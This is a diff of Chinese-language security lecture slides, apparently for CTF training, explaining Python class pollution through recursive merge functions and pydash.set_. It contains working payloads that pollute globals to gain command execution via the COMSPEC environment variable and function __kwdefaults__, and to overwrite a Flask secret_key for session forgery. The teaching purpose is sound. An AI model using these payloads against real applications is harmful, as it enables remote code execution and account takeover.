@@ -1973,7 +1973,7 @@ Python 中的每个对象中还有其他特殊属性，例如 `__class__`、`__d
 
 ---
 
-### Python 类污染：基础
+### Python 类污染：类属性都是可变的
 
 ```python {*}{lines:true}
 class Employee: pass # 创建一个空类
@@ -2013,7 +2013,7 @@ Python 中的这个特性让我想知道为什么我们不能应用原型污染�
 
 ---
 
-### Python 类污染：基础 2
+### Python 类污染：尝试赋值
 
 ```python {*}{lines:true}
 class Employee: pass # 创建一个空类
@@ -2026,10 +2026,289 @@ emp.__class__ = 'Polluted'
 #> TypeError: __class__ must be set to a class, not 'str' object
 ```
 
-<!--
-在我们的示例中，emp.__class__ 指向 Employee 类，因为它是该类的实例。您可以将 Python 中的 <instance>.__class__ 视为 JavaScript 中的 <instance>.constructor。
+在我们的示例中，`emp.__class__` 指向 `Employee` 类，因为它是该类的实例。我们可以将 Python 中的 `<instance>.__class__` 视为 JavaScript 中的 `<instance>.constructor`。
 
-即使我们在尝试将 emp 对象的 __class__ 属性设置为字符串时出错，该错误看起来很有希望！它表明 __class__ 必须设置为另一个类而不是字符串。这意味着它正在尝试用我们提供的内容覆盖该特殊属性，唯一的问题是我们尝试设置 __class__ 的值的数据类型。
+尝试将 `emp` 对象的 `__class__` 属性设置为字符串时出错，它表明 `__class__` 必须设置为另一个类而不是字符串。这意味着它正在尝试用我们提供的内容覆盖该特殊属性，唯一的问题是我们尝试设置 `__class__` 的值的数据类型。
 
-让我们尝试设置另一个接受字符串的属性，__class__ 的 __qualname__ 属性可能适合测试。__class__.__qualname__ 是一个包含类名的属性。
--->
+---
+
+### Python 类污染：赋值特殊属性
+
+```python {*}{lines:true}
+class Employee: pass # 创建一个空类
+
+emp = Employee()
+emp.__class__.__qualname__ = 'Polluted'
+
+print(emp)
+print(Employee)
+
+#> <__main__.Polluted object at 0x0000024765C48250>
+#> <class '__main__.Polluted'>
+```
+
+我们能够污染类并将 `__qualname__` 属性设置为任意字符串。请记住，当我们在类的对象上设置 `__class__.__qualname__` 时，该类（在我们的例子中是 `Employee`）的 `__qualname__` 属性已更改，这是因为 `__class__` 是对该对象类的引用，对它的任何修改实际上都将应用于该类的所有实例。
+
+---
+
+### Python 类污染：递归合并
+
+为了了解该漏洞在真实的 Python 应用程序中是如何存在的，我移植了递归合并 (merge) 函数，该函数被滥用于污染我们已知的正常原型污染中的对象原型。
+
+```python {all|3-14|16-22|24-34}{lines:true, maxHeight:'80%'}
+class Employee: pass # 创建一个空类
+
+def merge(src, dst):
+    # 递归合并函数
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+emp_info = {
+    "name":"Ahemd",
+    "age": 23,
+    "manager":{
+        "name":"Sarah"
+        }
+    }
+
+emp = Employee()
+print(vars(emp))
+
+merge(emp_info, emp)
+
+print(vars(emp))
+print(f'Name: {emp.name}, age: {emp.age}, manager name: {emp.manager.get("name")}')
+
+#> {}
+#> {'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
+#> Name: Ahemd, age: 23, manager name: Sarah
+```
+
+---
+
+### Python 类污染：递归合并特殊属性
+
+现在让我们尝试覆盖一些特殊属性！我们将更新 emp_info 以尝试像我们之前所做的那样通过 `emp.__class__.__qualname__` 设置 Employee 类的 `__qualname__` 属性，但这次使用合并函数。
+
+```python {all|5-16|19-24|26-41}{lines:true, maxHeight:'80%'}
+class Employee:
+    pass  # 创建一个空类
+
+
+def merge(src, dst):
+    # 递归合并函数
+    for k, v in src.items():
+        if hasattr(dst, "__getitem__"):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+
+emp_info = {
+    "name": "Ahemd",
+    "age": 23,
+    "manager": {"name": "Sarah"},
+    "__class__": {"__qualname__": "Polluted"},
+}
+
+emp = Employee()
+merge(emp_info, emp)
+
+print(vars(emp))
+print(emp)
+print(emp.__class__.__qualname__)
+
+print(Employee)
+print(Employee.__qualname__)
+
+# > {'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
+# > <__main__.Polluted object at 0x000001F80B20F5D0>
+# > Polluted
+
+# > <class '__main__.Polluted'>
+# > Polluted
+```
+
+---
+
+### Python 类污染：全局变量污染
+
+```python {3-10|12-24|26-30}{lines:true, maxHeight:'80%'}
+def merge(src, dst): ...
+
+class User:
+    def __init__(self):
+        pass
+
+class NotAccessibleClass:
+    pass
+
+not_accessible_variable = "Hello"
+
+merge(
+    {
+        "__class__": {
+            "__init__": {
+                "__globals__": {
+                    "not_accessible_variable": "Polluted variable",
+                    "NotAccessibleClass": {"__qualname__": "PollutedClass"},
+                }
+            }
+        }
+    },
+    User(),
+)
+
+print(not_accessible_variable)
+print(NotAccessibleClass)
+
+# > Polluted variable
+# > <class '__main__.PollutedClass'>
+```
+
+由于我们可以找到从我们拥有的实例访问它的属性/项目链，因此我们能够利用特殊属性 `__globals__` 来访问和设置 NotAccessibleClass 类的属性，并修改全局变量 `not_accessible_variable`。
+
+---
+
+### 合并函数的真实示例
+
+```python {*}{lines:true}
+import pydash
+
+class User:
+    def __init__(self):
+        pass
+
+class NotAccessibleClass: pass
+not_accessible_variable = 'Hello'
+
+pydash.set_(User(), '__class__.__init__.__globals__.not_accessible_variable','Polluted variable')
+print(not_accessible_variable)
+
+pydash.set_(User(), '__class__.__init__.__globals__.NotAccessibleClass.__qualname__','PollutedClass')
+print(NotAccessibleClass)
+
+#> Polluted variable
+#> <class '__main__.PollutedClass'>
+```
+
+---
+
+### 类污染利用： `subprocess` 或 `os` 污染环境变量
+
+```python {*}{lines:true}
+payload = {
+    "__class__": {
+        "__init__": {
+            "__globals__": {
+                "subprocess": {
+                    "os": {
+                        "environ": {"COMSPEC": "cmd /c calc"}  # 修改环境变量
+                    }
+                }
+            }
+        }
+    }
+}
+merge(payload, Employee())
+subprocess.Popen("whoami", shell=True)  # 弹出计算器
+```
+
+这么做可以控制执行子命令用的环境变量，在上面给出的示例中，可以通过上文中 Windows 下 `cmd.exe` 的特性（因为 `shell=True`）而执行任意指令。
+
+Linux 下有可能配合文件写原语，通过修改 `LD_PRELOAD` 等环境变量实现 RCE。
+
+---
+
+### 类污染利用：修改 `__kwdefaults__`
+
+Python 的函数有一个特殊方法叫 `__kwdefaults__`，可以通过它得到该函数关键词参数的默认值：
+
+```python
+def func(*, a, b=2):
+    print(a, b)
+
+func.__kwdefaults__['a'] = 'Polluted'
+
+func()
+
+#> Polluted 2
+```
+
+---
+
+### 类污染利用：修改 `__kwdefaults__` 2
+
+通过修改 `__kwdefaults__` 可以污染函数的关键词参数，从而污染函数的行为。
+
+```python
+from os import system
+import json
+
+def merge(src, dst): ...
+
+class Employee:
+    def __init__(self):
+        pass
+
+def execute(*, command='whoami'):
+    print(f'Executing {command}')
+    system(command)
+
+print(execute.__kwdefaults__) #> {'command': 'whoami'}
+execute() #> Executing whoami
+
+emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}')
+merge(emp_info, Employee())
+
+print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
+execute() #> Executing echo Polluted
+```
+
+---
+
+### 类污染利用：修改 Flask session 的 secret_key
+
+```python
+from flask import Flask, session
+
+app = Flask(__name__)
+app.secret_key = 'secret'
+
+@app.route('/')
+def index():
+    return session['username']
+
+class Employee:
+    def __init__(self):
+        pass
+
+merge(
+    {
+        "__class__": {"__init__": {"__globals__": {"app": {"secret_key": "Polluted"}}}}
+    },
+    Employee(),
+)
+
+print(app.secret_key) #> Polluted
+```
+
+这样就可以伪造 Flask session 的 secret_key，从而伪造 session 中的任意数据来做到任意用户登录。
+
+---
+
+### 题目：Sanic （CISCN 2024 初赛）
+
